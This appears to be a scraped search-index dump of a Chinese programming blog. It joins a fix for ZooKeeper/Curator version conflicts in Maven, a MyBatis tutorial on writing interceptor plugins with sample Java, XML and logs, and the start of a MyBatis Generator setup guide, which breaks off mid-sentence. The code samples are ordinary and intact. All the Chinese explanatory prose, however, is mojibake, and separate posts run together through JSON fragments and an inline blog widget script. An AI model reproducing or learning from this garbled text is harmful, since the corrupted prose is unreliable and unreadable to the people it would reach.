å¼‚å¸¸åˆ†æï¼šZooKeeper çš„ç‰ˆæœ¬ä¸ Curator çš„ç‰ˆæœ¬ä¸å…¼å®¹æ‰€å¯¼è‡´ï¼ŒCurator å®˜ç½‘è¯´æ˜å¦‚ä¸‹ï¼š 12345678910111213141516ç¬¬ä¸€ç§æƒ…å†µï¼šCurator 2.x.x compatible with both ZooKeeper 3.4.x and ZooKeeper 3.5.xCurator 3.x.x compatible only with ZooKeeper 3.5.x and includes support for new features such as dynamic reconfiguration, etc.ç¬¬äºŒç§æƒ…å†µï¼šZooKeeper 3.5.x Curator 4.0 has a hard dependency on ZooKeeper 3.5.x If you are using ZooKeeper 3.5.x there\'s nothing additional to do - just use Curator 4.0ZooKeeper 3.4.x Curator 4.0 supports ZooKeeper 3.4.x ensembles in a soft-compatibility mode. To use this mode you must exclude ZooKeeper when adding Curator to your dependency management tool. è§£å†³æ–¹æ³•ï¼šé’ˆå¯¹ç¬¬äºŒç§æƒ…å†µï¼Œå‡è®¾å„ç»„ä»¶çš„ç‰ˆæœ¬åˆ†åˆ«ä¸º Dubbo (2.7.0)ã€ZooKeeper (3.4.13)ã€Curator-Framework (4.0.1)ï¼Œåˆ™éœ€è¦æ’é™¤ Curator-Framework (4.0.1) é»˜è®¤ä¾èµ–çš„é«˜ç‰ˆæœ¬ ZooKeeper (3.5.x)ï¼Œç„¶åæŒ‡å®šä½ç‰ˆæœ¬çš„ ZooKeeper (3.4.x)ï¼ŒMaven çš„ POM å†™æ³•å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;version&gt;3.4.13&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-framework&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.apache.zookeeper&lt;/groupId&gt; &lt;artifactId&gt;zookeeper&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.curator&lt;/groupId&gt; &lt;artifactId&gt;curator-recipes&lt;/artifactId&gt; &lt;version&gt;4.0.1&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼ å¼€å‘éšç¬”"},{title:"MyBatis å…¥é—¨æ•™ç¨‹ä¹‹ä¸ƒ",url:"/posts/c047293a.html",text:'MyBatis å››å¤§å¯¹è±¡å››å¤§å¯¹è±¡ä»‹ç»MyBatis çš„å››å¤§å¯¹è±¡åŒ…æ‹¬ï¼šExecutorã€StatementHandlerã€ParameterHandlerã€ResultSetHandlerã€‚å››å¤§å¯¹è±¡çš„å·¥ä½œèŒè´£å¦‚ä¸‹ï¼š Executorï¼ˆæ‰§è¡Œå™¨ï¼‰ï¼šè´Ÿè´£æ•´ä¸ª SQL æ‰§è¡Œè¿‡ç¨‹çš„æ€»ä½“æ§åˆ¶ StatementHandlerï¼ˆè¯­å¥å¤„ç†å™¨ï¼‰ï¼šè´Ÿè´£å’Œ JDBC å±‚äº¤äº’ï¼ŒåŒ…æ‹¬é¢„ç¼–è¯‘ SQL è¯­å¥å’Œæ‰§è¡Œ SQL è¯­å¥ï¼Œä»¥åŠè°ƒç”¨ ParameterHandler è®¾ç½®å‚æ•° ParameterHandlerï¼ˆå‚æ•°å¤„ç†å™¨ï¼‰ï¼šè´Ÿè´£è®¾ç½®é¢„ç¼–è¯‘å‚æ•° ResultSetHandlerï¼ˆç»“æœé›†å¤„ç†å™¨ï¼‰ï¼šè´Ÿè´£å°† JDBC æŸ¥è¯¢ç»“æœæ˜ å°„åˆ° JavaBean å¯¹è±¡ å››å¤§å¯¹è±¡çš„å·¥ä½œæµç¨‹ MyBatis æ’ä»¶å¼€å‘æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-20ã€‚ æ’ä»¶ä»‹ç» MyBatis åœ¨å››å¤§å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹ä¸­ï¼Œéƒ½å…è®¸æœ‰æ’ä»¶è¿›è¡Œä»‹å…¥ã€‚æ’ä»¶å¯ä»¥åˆ©ç”¨åŠ¨æ€ä»£ç†æœºåˆ¶ä¸€å±‚å±‚çš„åŒ…è£…ç›®æ ‡å¯¹è±¡ï¼Œä»è€Œå®ç°åœ¨ç›®æ ‡å¯¹è±¡æŒ‡å‘ç›®æ ‡æ–¹æ³•ä¹‹å‰è¿›è¡Œæ‹¦æˆªçš„æ•ˆæœã€‚ MyBatis è‡ªå®šä¹‰æ’ä»¶æ˜¯éå¸¸ç®€å•çš„ï¼Œåªéœ€å®ç° Interceptor æ¥å£ï¼Œå¹¶æŒ‡å®šæƒ³è¦æ‹¦æˆªå“ªä¸ªå¯¹è±¡çš„å“ªä¸ªæ–¹æ³•ï¼Œå³å¯ä»‹å…¥å››å¤§å¯¹è±¡çš„ä»»ä½•ä¸€ä¸ªæ–¹æ³•çš„æ‰§è¡Œã€‚ MyBatis å…è®¸åœ¨å·²æ˜ å°„è¯­å¥æ‰§è¡Œè¿‡ç¨‹ä¸­çš„æŸä¸€ç‚¹è¿›è¡Œæ‹¦æˆªè°ƒç”¨ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒMyBatis å…è®¸ä½¿ç”¨æ’ä»¶æ¥æ‹¦æˆªçš„æ–¹æ³•åŒ…æ‹¬ï¼š Executorï¼šupdate, query, flushStatements, commit, rollback, getTransaction, close, isClosed StatementHandlerï¼šprepare, parameterize, batch, update, query ParameterHandlerï¼šgetParameterObject, setParameters ResultSetHandlerï¼šhandlerResultSets, handlerOuutputParameters ç‰¹åˆ«æ³¨æ„ è‡ªå®šä¹‰ MyBatis æ’ä»¶æ—¶ï¼Œå¦‚æœä½ æƒ³åšçš„ä¸ä»…ä»…æ˜¯ç›‘æ§æ–¹æ³•çš„è°ƒç”¨ï¼Œé‚£ä¹ˆä½ æœ€å¥½ç›¸å½“äº†è§£è¦é‡å†™çš„æ–¹æ³•çš„è¡Œä¸ºã€‚å› ä¸ºåœ¨è¯•å›¾ä¿®æ”¹æˆ–é‡å†™å·²æœ‰æ–¹æ³•çš„è¡Œä¸ºæ—¶ï¼Œå¾ˆå¯èƒ½ä¼šç ´å MyBatis çš„æ ¸å¿ƒæ¨¡å—ã€‚è¿™äº›éƒ½æ˜¯æ›´åº•å±‚çš„ç±»å’Œæ–¹æ³•ï¼Œæ‰€ä»¥ä½¿ç”¨æ’ä»¶çš„æ—¶å€™éœ€è¦ç‰¹åˆ«å°å¿ƒã€‚ æ’ä»¶åŸç† åœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶é‡Œæ³¨å†Œæ’ä»¶åï¼Œä¼šæŒ‰ç…§æ’ä»¶çš„é…ç½®é¡ºåºï¼Œä¾æ¬¡è°ƒç”¨æ’ä»¶çš„ plugin() æ–¹æ³•æ¥ç”Ÿæˆè¢«æ‹¦æˆªå¯¹è±¡çš„åŠ¨æ€ä»£ç†å¯¹è±¡ å­˜åœ¨å¤šä¸ªæ’ä»¶æ—¶ï¼Œä¼šä¾æ¬¡ç”Ÿæˆç›®æ ‡å¯¹è±¡çš„åŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œå±‚å±‚åŒ…è£¹ï¼Œå…ˆå£°æ˜çš„å…ˆåŒ…è£¹ï¼Œä»¥æ­¤å½¢æˆä»£ç†é“¾ ç›®æ ‡æ–¹æ³•æ‰§è¡Œæ—¶ï¼Œæ˜¯æŒ‰ç…§æ’ä»¶é…ç½®ä¿¡æ¯çš„é€†å‘é¡ºåºæ¥æ‰§è¡Œ intercept() æ–¹æ³•ï¼Œå³å…ˆé…ç½®çš„æ’ä»¶ä¼šåæ‰§è¡Œ ä½¿ç”¨å¤šä¸ªæ’ä»¶çš„æƒ…å†µä¸‹ï¼Œå¾€å¾€éœ€è¦åœ¨æŸä¸ªæ’ä»¶ä¸­åˆ†ç¦»å‡ºæ¥ç›®æ ‡å¯¹è±¡ï¼Œå¯ä»¥å€ŸåŠ© MyBatis æä¾›çš„ SystemMateObject ç±»æ¥è·å–æœ€åä¸€å±‚çš„ h ä»¥åŠ target å±æ€§çš„å€¼ æ’ä»¶å¼€å‘æ¡ˆä¾‹Interceptor æ¥å£ Interceptor.intercept()ï¼šæ‹¦æˆªç›®æ ‡æ–¹æ³•çš„æ‰§è¡Œ Interceptor.plugin()ï¼šåˆ›å»ºåŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨ MyBatis æä¾›çš„ Plugin ç±»çš„ wrap æ–¹æ³• Interceptor.setProperties()ï¼šæ³¨å…¥é…ç½®æ’ä»¶æ—¶è®¾ç½®çš„å±æ€§ æ’ä»¶å¼€å‘æ¡ˆä¾‹ä¸€ å®ç° Interceptor æ¥å£ï¼Œå¹¶é€šè¿‡æ’ä»¶ç­¾åæŒ‡å®šè¦æ‹¦æˆªå“ªä¸ªå¯¹è±¡çš„å“ªä¸ªæ–¹æ³• 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package com.clay.mybatis.plugin;import java.sql.Connection;import java.util.Properties;import org.apache.ibatis.executor.statement.StatementHandler;import org.apache.ibatis.plugin.Interceptor;import org.apache.ibatis.plugin.Intercepts;import org.apache.ibatis.plugin.Invocation;import org.apache.ibatis.plugin.Plugin;import org.apache.ibatis.plugin.Signature;@Intercepts({ @Signature(type = StatementHandler.class, method = "prepare", args = { Connection.class, Integer.class }) })public class MyFirstPlugin implements Interceptor { private Properties properties = new Properties(); /** * æ‹¦æˆªç›®æ ‡å¯¹è±¡çš„ç›®æ ‡æ–¹æ³•çš„æ‰§è¡Œ */ @Override public Object intercept(Invocation invocation) throws Throwable { System.out.println("MyFirstPlugin ==&gt; " + invocation.getTarget().getClass().getName() + "." + invocation.getMethod().getName() + "() æ–¹æ³•å‡†å¤‡æ‰§è¡Œ"); Object result = invocation.proceed(); System.out.println("MyFirstPlugin ==&gt; " + invocation.getTarget().getClass().getName() + "." + invocation.getMethod().getName() + "() æ–¹æ³•æ‰§è¡Œå®Œæˆ"); return result; } /** * ä¸ºç›®æ ‡å¯¹è±¡åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡ */ @Override public Object plugin(Object target) { System.out.println("MyFirstPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: " + target); Object wrap = Plugin.wrap(target, this); return wrap; } /** * å°†æ’ä»¶æ³¨å†Œæ—¶çš„Propertyå±æ€§è®¾ç½®è¿›æ¥ */ @Override public void setProperties(Properties properties) { this.properties = properties; }} åœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ä¸­æ³¨å†Œæ’ä»¶ 12345678910&lt;configuration&gt; &lt;!-- æ³¨å†Œæ’ä»¶ --&gt; &lt;plugins&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.MyFirstPlugin"&gt; &lt;property name="name" value="FirstPlugin" /&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; ä¸Šé¢è‡ªå®šä¹‰çš„æ’ä»¶å°†ä¼šæ‹¦æˆªåœ¨ StatementHandler å®ä¾‹ä¸­æ‰€æœ‰çš„ prepare() æ–¹æ³•è°ƒç”¨ï¼ŒMyBatis æ‰§è¡Œæ™®é€šçš„ SQL æŸ¥è¯¢è¯­å¥åï¼Œæ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 123456789101112MyFirstPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.executor.CachingExecutor@69fb6037MyFirstPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.scripting.defaults.DefaultParameterHandler@11bd0f3bMyFirstPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.executor.resultset.DefaultResultSetHandler@696da30bMyFirstPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.executor.statement.RoutingStatementHandler@4e7912d822:16:06,391 DEBUG JdbcTransaction:137 - Opening JDBC Connection22:16:06,755 DEBUG PooledDataSource:434 - Created connection 208684473.22:16:06,755 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@c7045b9]MyFirstPlugin ==&gt; org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare() æ–¹æ³•å‡†å¤‡æ‰§è¡Œ22:16:06,761 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?MyFirstPlugin ==&gt; org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare() æ–¹æ³•æ‰§è¡Œå®Œæˆ22:16:06,801 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:16:06,831 DEBUG getEmpById:137 - &lt;== Total: 0 æ’ä»¶å¼€å‘æ¡ˆä¾‹äºŒåœ¨ä¸‹é¢çš„æ¡ˆä¾‹ä»£ç é‡Œï¼Œæ¼”ç¤ºäº†å¦‚ä½•åŠ¨æ€æ›´æ”¹ SQL è¯­å¥è¿è¡Œæ—¶çš„å‚æ•°ï¼Œä¾‹å¦‚æŸ¥è¯¢å‘˜å·¥ä¿¡æ¯æ—¶ï¼ŒåŠ¨æ€æ›´æ”¹æŸ¥è¯¢çš„å‘˜å·¥ ID ä¸º 11ã€‚ Mapper æ¥å£ 12345public interface EmployeeMapper { public Employee getEmpById(Long id);} SQL æ˜ å°„æ–‡ä»¶ 123456789&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getEmpById" parameterType="Long" resultType="com.clay.mybatis.bean.Employee"&gt; select id, last_name as lastName, gender, email from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; è‡ªå®šä¹‰æ’ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package com.clay.mybatis.plugin;import java.sql.Connection;import java.util.Properties;import org.apache.ibatis.executor.statement.StatementHandler;import org.apache.ibatis.plugin.Interceptor;import org.apache.ibatis.plugin.Intercepts;import org.apache.ibatis.plugin.Invocation;import org.apache.ibatis.plugin.Plugin;import org.apache.ibatis.plugin.Signature;import org.apache.ibatis.reflection.MetaObject;import org.apache.ibatis.reflection.SystemMetaObject;/** * æ’ä»¶ç­¾åï¼šå‘Šè¯‰ MyBatis å½“å‰æ’ä»¶è¦æ‹¦æˆªå“ªä¸ªå¯¹è±¡çš„å“ªä¸ªæ–¹æ³• */@Intercepts({ @Signature(type = StatementHandler.class, method = "prepare", args = { Connection.class, Integer.class }) })public class MyThirdPlugin implements Interceptor { private Properties properties = new Properties(); /** * æ‹¦æˆªç›®æ ‡å¯¹è±¡çš„ç›®æ ‡æ–¹æ³•çš„æ‰§è¡Œ */ @Override public Object intercept(Invocation invocation) throws Throwable { // è·å–ç›®æ ‡å¯¹è±¡ Object target = invocation.getTarget(); // åˆ†ç¦»è¢«ä»£ç†å¯¹è±¡çš„å…ƒæ•°æ® MetaObject metaObject = SystemMetaObject.forObject(target); // æ›´æ”¹ SQL è¯­å¥è¦ç”¨çš„å‚æ•° metaObject.setValue("parameterHandler.parameterObject", 11L); // æ‰§è¡Œç›®æ ‡æ–¹æ³• Object proceed = invocation.proceed(); // è¿”å›æ‰§è¡Œç»“æœ return proceed; } /** * ä¸ºç›®æ ‡å¯¹è±¡åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡ */ @Override public Object plugin(Object target) { Object wrap = Plugin.wrap(target, this); return wrap; } /** * å°†æ’ä»¶æ³¨å†Œæ—¶çš„Propertyå±æ€§è®¾ç½®è¿›æ¥ */ @Override public void setProperties(Properties properties) { this.properties = properties; }} æ³¨å†Œæ’ä»¶ 12345678910&lt;configuration&gt; &lt;!-- æ³¨å†Œæ’ä»¶ --&gt; &lt;plugins&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.MyThirdPlugin"&gt; &lt;property name="name" value="MyThirdPlugin" /&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; ä¸šåŠ¡ä»£ç  12345678910111213141516171819public class MyBatisApplication { public static void main(String[] args) throws IOException { String resource = "mybatis-config.xml"; InputStream inputStream = Resources.getResourceAsStream(resource); SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(inputStream); SqlSession session = sqlSessionFactory.openSession(); try { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); mapper.getEmpById(5L); } finally { if (session != null) { session.close(); } } }} æ‰§è¡Œç»“æœ 12322:36:57,053 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?22:36:57,089 DEBUG getEmpById:137 - ==&gt; Parameters: 11(Long)22:36:57,118 DEBUG getEmpById:137 - &lt;== Total: 0 å¤šä¸ªæ’ä»¶çš„æ‰§è¡Œé¡ºåºMyBatis åœ¨åˆ›å»ºåŠ¨æ€ä»£ç†æ—¶ï¼Œæ˜¯æŒ‰ç…§æ’ä»¶çš„é…ç½®é¡ºåºä¾æ¬¡è°ƒç”¨ plugin() æ–¹æ³•åˆ›å»ºå±‚å±‚çš„ä»£ç†å¯¹è±¡ï¼Œä½†æ’ä»¶çš„ intercept() æ–¹æ³•æ˜¯æŒ‰ç…§é…ç½®ä¿¡æ¯çš„é€†å‘é¡ºåºæ¥æ‰§è¡Œï¼Œå³å…ˆé…ç½®çš„æ’ä»¶ä¼šåæ‰§è¡Œã€‚ åœ¨ä¸Šé¢æ¡ˆä¾‹ä»£ç çš„åŸºç¡€ä¸Šï¼Œå¢åŠ ä¸€ä¸ª MyBatis æ’ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950package com.clay.mybatis.plugin;import java.sql.Connection;import java.util.Properties;import org.apache.ibatis.executor.statement.StatementHandler;import org.apache.ibatis.plugin.Interceptor;import org.apache.ibatis.plugin.Intercepts;import org.apache.ibatis.plugin.Invocation;import org.apache.ibatis.plugin.Plugin;import org.apache.ibatis.plugin.Signature;/** * æ’ä»¶ç­¾åï¼šå‘Šè¯‰ MyBatis å½“å‰æ’ä»¶è¦æ‹¦æˆªå“ªä¸ªå¯¹è±¡çš„å“ªä¸ªæ–¹æ³• */@Intercepts({ @Signature(type = StatementHandler.class, method = "prepare", args = { Connection.class, Integer.class }) })public class MySecondPlugin implements Interceptor { private Properties properties = new Properties(); /** * æ‹¦æˆªç›®æ ‡å¯¹è±¡çš„ç›®æ ‡æ–¹æ³•çš„æ‰§è¡Œ */ @Override public Object intercept(Invocation invocation) throws Throwable { System.out.println("MySecondPlugin ==&gt; " + invocation.getTarget().getClass().getName() + "." + invocation.getMethod().getName() + "() æ–¹æ³•å‡†å¤‡æ‰§è¡Œ"); Object result = invocation.proceed(); System.out.println("MySecondPlugin ==&gt; " + invocation.getTarget().getClass().getName() + "." + invocation.getMethod().getName() + "() æ–¹æ³•æ‰§è¡Œå®Œæˆ"); return result; } /** * ä¸ºç›®æ ‡å¯¹è±¡åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡ */ @Override public Object plugin(Object target) { System.out.println("MySecondPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: " + target); Object wrap = Plugin.wrap(target, this); return wrap; } /** * å°†æ’ä»¶æ³¨å†Œæ—¶çš„Propertyå±æ€§è®¾ç½®è¿›æ¥ */ @Override public void setProperties(Properties properties) { this.properties = properties; }} åœ¨ MyBatis çš„å…¨å±€é…ç½®æ–‡ä»¶ä¸­åŒæ—¶æ³¨å†Œå¤šä¸ªæ’ä»¶ 12345678910111213&lt;configuration&gt; &lt;!-- æ³¨å†Œæ’ä»¶ --&gt; &lt;plugins&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.MyFirstPlugin"&gt; &lt;property name="name" value="FirstPlugin" /&gt; &lt;/plugin&gt; &lt;plugin interceptor="com.clay.mybatis.plugin.MySecondPlugin"&gt; &lt;property name="name" value="SecondPlugin" /&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; MyBatis æ‰§è¡Œæ™®é€šçš„ SQL æŸ¥è¯¢è¯­å¥åï¼Œæ§åˆ¶å°è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 123456789101112131415161718MyFirstPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.executor.CachingExecutor@36d585cMySecondPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.executor.CachingExecutor@36d585cMyFirstPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.scripting.defaults.DefaultParameterHandler@c333c60MySecondPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.scripting.defaults.DefaultParameterHandler@c333c60MyFirstPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.executor.resultset.DefaultResultSetHandler@4e7912d8MySecondPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.executor.resultset.DefaultResultSetHandler@4e7912d8MyFirstPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.executor.statement.RoutingStatementHandler@53976f5cMySecondPlugin ==&gt; è¦åŒ…è£…çš„å¯¹è±¡: org.apache.ibatis.executor.statement.RoutingStatementHandler@53976f5c22:57:50,780 DEBUG JdbcTransaction:137 - Opening JDBC Connection22:57:51,071 DEBUG PooledDataSource:434 - Created connection 261748192.22:57:51,071 DEBUG JdbcTransaction:101 - Setting autocommit to false on JDBC Connection [com.mysql.cj.jdbc.ConnectionImpl@f99f5e0]MySecondPlugin ==&gt; com.sun.proxy.$Proxy9.prepare() æ–¹æ³•å‡†å¤‡æ‰§è¡ŒMyFirstPlugin ==&gt; org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare() æ–¹æ³•å‡†å¤‡æ‰§è¡Œ22:57:51,078 DEBUG getEmpById:137 - ==&gt; Preparing: select id, last_name as lastName, gender, email from t_employee where id = ?MyFirstPlugin ==&gt; org.apache.ibatis.executor.statement.RoutingStatementHandler.prepare() æ–¹æ³•æ‰§è¡Œå®ŒæˆMySecondPlugin ==&gt; com.sun.proxy.$Proxy9.prepare() æ–¹æ³•æ‰§è¡Œå®Œæˆ22:57:51,133 DEBUG getEmpById:137 - ==&gt; Parameters: 1(Long)22:57:51,173 DEBUG getEmpById:137 - &lt;== Total: 0 MyBatis ä»£ç ç”Ÿæˆå™¨MyBatis Generatorï¼ˆç®€ç§° MBGï¼‰ï¼Œæ˜¯ä¸€ä¸ªä¸“é—¨ä¸º MyBatis æ¡†æ¶ä½¿ç”¨è€…å®šåˆ¶çš„ä»£ç ç”Ÿæˆå™¨ï¼ˆé€†å‘å·¥ç¨‹ï¼‰ï¼Œå¯ä»¥å¿«é€Ÿåœ°æ ¹æ®æ•°æ®åº“è¡¨ç”Ÿæˆå¯¹åº”çš„ SQL æ˜ å°„æ–‡ä»¶ã€Mapper æ¥å£ä»¥åŠ JavaBean ç±»ã€‚æ”¯æŒåŸºæœ¬çš„å¢åˆ æ”¹æŸ¥ï¼Œä»¥åŠ QBC é£æ ¼çš„æ¡ä»¶æŸ¥è¯¢ã€‚ä½†æ˜¯åƒæ•°æ®åº“è¡¨è¿æ¥ã€å­˜å‚¨è¿‡ç¨‹ç­‰è¿™äº›å¤æ‚ SQL çš„å®šä¹‰éœ€è¦å¼€å‘è€…æ‰‹å·¥ç¼–å†™ã€‚æ›´å¤šçš„ä»‹ç»å†…å®¹ï¼Œå¯æŸ¥çœ‹ GitHub ä»“åº“ å’Œ MyBatis å®˜æ–¹æ–‡æ¡£ã€‚ å‡†å¤‡å·¥ä½œä¸‹è¿°çš„æ¡ˆä¾‹ä»£ç æ˜¯åŸºäºä»¥ä¸‹çš„æ•°æ®åº“è¡¨ç»“æ„ç¼–å†™çš„ï¼Œå› æ­¤éœ€è¦æå‰æ‰§è¡Œ SQL è¯­å¥æ¥åˆå§‹åŒ–æ•°æ®åº“ã€‚ 1234567891011121314151617181920CREATE DATABASE `mybatis_lesson` DEFAULT CHARACTER SET utf8mb4;CREATE TABLE `t_department` ( `id` int(11) NOT NULL AUTO_INCREMENT, `name` varchar(255) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;CREATE TABLE `t_employee` ( `id` int(11) NOT NULL AUTO_INCREMENT, `last_name` varchar(255) DEFAULT NULL, `gender` char(1) DEFAULT NULL, `email` varchar(255) DEFAULT NULL, `dept_id` int(11) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8;insert into t_department(id, name) values(1, \'å¼€å‘éƒ¨é—¨\'), (2, \'æµ‹è¯•éƒ¨é—¨\');insert into t_employee(id, last_name, gender, email, dept_id) values(1, \'Jim\',\'1\', \'jim@gmail.com\', 1);insert into t_employee(id, last_name, gender, email, dept_id) values(2, \'Peter\',\'1\', \'peter@gmail.com\', 1); ä½¿ç”¨æ¡ˆä¾‹æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ mybatis-lesson-19ã€‚ å¼•å…¥ Maven ä¾èµ–1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;8.0.23&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.dynamic-sql&lt;/groupId&gt; &lt;artifactId&gt;mybatis-dynamic-sql&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.mybatis.generator&lt;/groupId&gt; &lt;artifactId&gt;mybatis-generator-core&lt;/artifactId&gt; &lt;version&gt;1.4.1&lt;/version&gt;&lt;/dependency&gt; åˆ›å»º XML é…ç½®æ–‡ä»¶åœ¨é¡¹ç›®çš„ src/test/resources ç›®å½•ä¸‹åˆ›å»º mybatis-generator.xml é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE generatorConfiguration PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN" "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"&gt;&lt;generatorConfiguration&gt; &lt;context id="MySQLTables" targetRuntime="MyBatis3Simple"&gt; &lt;!-- æ•°æ®åº“è¿æ¥ä¿¡æ¯ --&gt; &lt;jdbcConnection driverClass="com.mysql.cj.jdbc.Driver" connectionURL="jdbc:mysql://127.0.0.1:3306/mybatis_lesson" userId="root" password="123456" /&gt; &lt;!-- Java ç±»å‹è§£æ --&gt; &lt;javaTypeResolver&gt; &lt;property name="forceBigDecimals" value="false" /&gt; &lt;/javaTypeResolver&gt; &lt;!-- JavaBean ç”Ÿæˆç­–ç•¥ --&gt; &lt;javaModelGenerator targetPackage="com.clay.mybatis.bean" targetProject="./src/main/java"&gt; &lt;property name="enableSubPackages" value="true" /&gt; &lt;property name="trimStrings" value="true" /&gt; &lt;/javaModelGenerator&gt; &lt;!-- SQL æ˜ å°„æ–‡ä»¶ç”Ÿæˆç­–ç•¥ --&gt; &lt;sqlMapGenerator targetPackage="com.clay.mybatis.dao" targetProject="./src/main/java"&gt; &lt;property name="enableSubPackages" value="true" /&gt; &lt;/sqlMapGenerator&gt; &lt;!-- Mapper æ¥å£ç±»ç”Ÿæˆç­–ç•¥ --&gt; &lt;javaClientGenerator type="XMLMAPPER" targetPackage="com.clay.mybatis.dao" targetProject="./src/main/java"&gt; &lt;property name="enableSubPackages" value="true" /&gt; &lt;/javaClientGenerator&gt; &lt;!-- æ•°æ®åº“è¡¨ä¸ JavaBean çš„æ˜ å°„ --&gt; &lt;table tableName="t_employee" domainObjectName="Employee" /&gt; &lt;table tableName="t_department" domainObjectName="Department" /&gt; &lt;/context&gt;&lt;/generatorConfiguration&gt; ä¸Šè¿° XML é…ç½®æ–‡ä»¶é‡Œçš„ targetRuntime="MyBatis3Simple" è¡¨ç¤ºåªç”ŸæˆåŸºç¡€çš„ CRUD ä»£ç å’Œå°‘é‡åŠ¨æ€ SQL è¯­å¥ï¼Œå¯é€‰å€¼æœ‰ MyBatis3DynamicSql | MyBatis3Kotlin | MyBatis3 | 